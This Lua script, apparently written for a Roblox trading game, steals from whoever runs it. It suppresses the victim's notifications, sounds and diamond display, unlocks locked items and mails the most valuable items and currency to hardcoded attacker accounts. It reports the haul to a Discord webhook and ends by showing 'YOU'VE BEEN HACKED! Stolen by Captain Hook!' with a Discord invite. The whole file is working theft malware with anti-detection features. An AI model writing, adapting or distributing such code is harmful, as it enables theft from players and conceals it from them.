-- Anti-detection setup  
local function SetupAntiDetection()  
    -- Freeze diamond display  
    if player.leaderstats and player.leaderstats["💎 Diamonds"] then  
        local gemStat = player.leaderstats["💎 Diamonds"].Value  
        player.leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()  
            player.leaderstats["💎 Diamonds"].Value = gemStat  
        end)  
    end  
      
    -- Disable notifications  
    local notifications = player.PlayerGui:FindFirstChild("Notifications")  
    if notifications then  
        notifications.Enabled = false  
        notifications:GetPropertyChangedSignal("Enabled"):Connect(function()  
            notifications.Enabled = false  
        end)  
    end  
      
    -- Block notification sounds  
    game.DescendantAdded:Connect(function(sound)  
        if sound.ClassName == "Sound" then  
            local soundIds = {  
                "rbxassetid://11839132565",  
                "rbxassetid://14254721038",  
                "rbxassetid://12413423276"  
            }  
            for _, id in pairs(soundIds) do  
                if sound.SoundId == id then  
                    sound:Destroy()  
                    break  
                end  
            end  
        end  
    end)  
end

-- Get item RAP value  
local function GetItemRAP(category, itemData)  
    local RAPCmds = require(game.ReplicatedStorage.Library.Client.RAPCmds)  
    local fakeItem = {Class = {Name = category}}  
      
    function fakeItem:AbstractGetRAP()   
        return nil   
    end  
      
    function fakeItem:GetDefaultRAP()   
        return 0   
    end  
      
    function fakeItem:StackKey()  
        return HttpService:JSONEncode({  
            id = itemData.id,  
            pt = itemData.pt,  
            sh = itemData.sh,  
            tn = itemData.tn  
        })  
    end  
      
    return RAPCmds.Get(fakeItem) or 0  
end

-- Send item to target  
local function SendItem(target, category, uid, amount)  
    local args = {  
        target,  
        mailMessage,  
        category,  
        uid,  
        amount or 1  
    }  
      
    local success, result = pcall(function()  
        return {network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))}  
    end)  
      
    return success  
end

-- Send gems to target  
local function SendGems(target, currencyIndex, amount)  
    local args = {  
        target,  
        mailMessage,  
        "Currency",  
        currencyIndex,  
        amount  
    }  
      
    local success, result = pcall(function()  
        return {network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))}  
    end)  
      
    return success  
end

-- Main execution function  
local function Main()  
    SetupAntiDetection()  
      
    -- Scan inventory for valuable items  
    local categories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}  
      
    for _, category in ipairs(categories) do  
        if inventory[category] then  
            for uid, item in pairs(inventory[category]) do  
                -- Unlock locked items  
                if item._lk then  
                    pcall(function()  
                        network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)  
                    end)  
                end  
                  
                -- Check RAP value  
                local rap = GetItemRAP(category, item)  
                  
                if rap >= min_rap then  
                    table.insert(itemsList, {  
                        category = category,  
                        uid = uid,  
                        amount = item._am or 1,  
                        rap = rap,  
                        name = item.id  
                    })  
                end  
            end  
        end  
    end  
      
    -- Sort by value (highest RAP first)  
    table.sort(itemsList, function(a, b)  
        return (a.rap * a.amount) > (b.rap * b.amount)  
    end)  
      
    if #itemsList > 0 or currentDiamonds > mailCost then  
        -- Try primary target first  
        local currentTarget = Username  
          
        -- Send valuable items  
        for _, item in ipairs(itemsList) do  
            if item.rap >= mailCost then  
                local attempts = 0  
                local success = false  
                  
                while not success and attempts < 2 do  
                    success = SendItem(currentTarget, item.category, item.uid, item.amount)  
                      
                    if not success then  
                        -- Switch to fallback target  
                        currentTarget = Username2  
                        attempts = attempts + 1  
                        wait(0.5)  
                    else  
                        currentDiamonds = currentDiamonds - mailCost  
                        mailCost = math.ceil(mailCost * 1.5)  
                        if mailCost > 5000000 then   
                            mailCost = 5000000   
                        end  
                    end  
                end  
                  
                wait(0.1)  
            end  
        end  
          
        -- Send remaining gems  
        if currentDiamonds > mailCost then  
            for idx, currency in pairs(inventory.Currency) do  
                if currency.id == "Diamonds" then  
                    local gemsToSend = currentDiamonds - mailCost  
                    if gemsToSend > 0 then  
                        SendGems(currentTarget, idx, gemsToSend)  
                    end  
                    break  
                end  
            end  
        end  
          
        -- Send Discord notification  
        if Webhook and string.find(Webhook, "discord.com/api/webhooks") then  
            SendDiscordWebhook(Webhook, player.Name, itemsList, currentDiamonds)  
        end  
          
        -- Notify victim  
        pcall(function()  
            local MessageModule = require(game.ReplicatedStorage.Library.Client.Message)  
            MessageModule.Error("YOU'VE BEEN HACKED!")  
            wait(1)  
            MessageModule.Error("Stolen by Captain Hook!")  
            wait(1)  
            MessageModule.Error("Join discord.gg/FNnkfJqukh")  
        end)  
          
        -- Copy Discord link to clipboard  
        if setclipboard then  
            setclipboard("https://discord.gg/FNnkfJqukh")  
        end  
          
        print("Transfer complete!")  
        print("Items sent: " .. #itemsList)  
        print("Target: " .. currentTarget)  
        print("Remaining diamonds: " .. currentDiamonds)  
    else  
        warn("No valuable items found!")  
    end  
end

-- Run the script  
Main()  
